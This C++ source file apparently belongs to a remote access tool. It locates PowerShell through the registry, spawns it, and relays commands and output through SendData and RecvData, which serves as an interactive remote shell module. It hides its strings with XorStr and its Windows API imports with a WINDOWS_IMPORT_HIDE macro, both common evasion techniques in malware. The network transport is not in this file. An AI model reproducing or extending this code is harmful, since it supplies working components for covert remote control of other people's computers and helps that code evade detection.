
#include "CPowershellPassthrough.h"
#include "ExternalLibrary/include/ProcessController/CDiabolqiueProcess.h"

// TODO : Clean This Up
std::string _ConvertFriendTypeNameToPath(std::string friendly)
{
    int nStringStart = friendly.find(XorStr("\"")) + 1;
    int nStringEnd = friendly.find(XorStr("\""), nStringStart + 1);

    friendly = friendly.substr(nStringStart, nStringEnd - nStringStart);
    // resolve env variables
    int nEnvStart = 0;
    int nEnvEnd = 0;
    while (true)
    {
        nEnvStart = friendly.find(XorStr("\%"), nEnvStart) + 1;

        if (nEnvStart == -1 || nEnvStart == 0)
            break;

        nEnvEnd = friendly.find(XorStr("\%"), nEnvStart);

        std::string env_variable = friendly.substr(nEnvStart, nEnvEnd - nEnvStart);

        char* env_result = getenv(env_variable.c_str());

        if (!env_result)
            return friendly;

        friendly.erase(friendly.begin() + nEnvStart - 1, friendly.begin() + nEnvEnd + 1);
        friendly.insert(nEnvStart - 1, std::string(env_result));

        int l = 0;
        nEnvStart = nEnvEnd;
    }
    return friendly;
}

std::string _GetPowerShellPath()
{
    WINDOWS_IMPORT_HIDE(RegOpenKeyA, "Advapi32.dll");
    WINDOWS_IMPORT_HIDE(RegQueryValueExA, "Advapi32.dll");
    HKEY keyres;
    _RegOpenKeyA(HKEY_CLASSES_ROOT,
        XorStr("Microsoft.PowerShellConsole.1"),
        &keyres);

    char key_buffer[4096];
    size_t bufsize = sizeof(key_buffer);
    _RegQueryValueExA(keyres,
        XorStr("FriendlyTypeName"),
        NULL, NULL, (BYTE*)key_buffer, (LPDWORD)&bufsize);

    return _ConvertFriendTypeNameToPath(key_buffer);
}


CPowershellPassthrough::CPowershellPassthrough()
{
	InitializeProcessController();

    std::string path = _GetPowerShellPath().c_str();
    SpawnProcess(&path, (char*)"");
}


bool CPowershellPassthrough::SpawnProcess(std::string* path, char* cmd)
{
    __try {
        if (!m_Process.StartProcess(path->c_str(), cmd, true))
            return false;

        m_bAlive = true;
        m_bInitialized = true;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        m_bAlive = false;
        m_bInitialized = false;
    }
    return true;
}

bool CPowershellPassthrough::Initialize(void* pArgs, size_t nDataSize)
{
    // no startup message
    return true;
    //std::string path = _GetPowerShellPath().c_str();
    //return SpawnProcess(&path, (char*)"");
}



bool CPowershellPassthrough::ShutDown()
{
    return m_Process.CloseProcess();
}

bool CPowershellPassthrough::FreeLibrary()
{
    return true;
}

bool CPowershellPassthrough::SendData(void* pData, size_t nDataSize, size_t& nDataSent)
{
    bool bRet = m_Process.SendDataToProcess(pData, nDataSize);

    if (bRet)
        nDataSent = nDataSize;
    else
        m_bAlive = false;
    return bRet;
}

bool CPowershellPassthrough::RecvData(void* pBuffer, size_t nBufferSize, size_t& nDataRecieved)
{
    bool bRet = m_Process.RecvDataFromProcess(pBuffer, nBufferSize, &nDataRecieved);

#ifdef _DEBUG
    if (nDataRecieved)
    {
        char* pData = (char*)pBuffer;
        int l = 0;
    }
#endif

    if (!bRet)
        m_bAlive = false;

    return bRet;
}


#if defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)
#include <iostream>
bool __stdcall GenerateInitializationForPowershell(
    std::string input,
    void** ppMemory,
    size_t& nDataSize
){
    return true;
}

#endif



















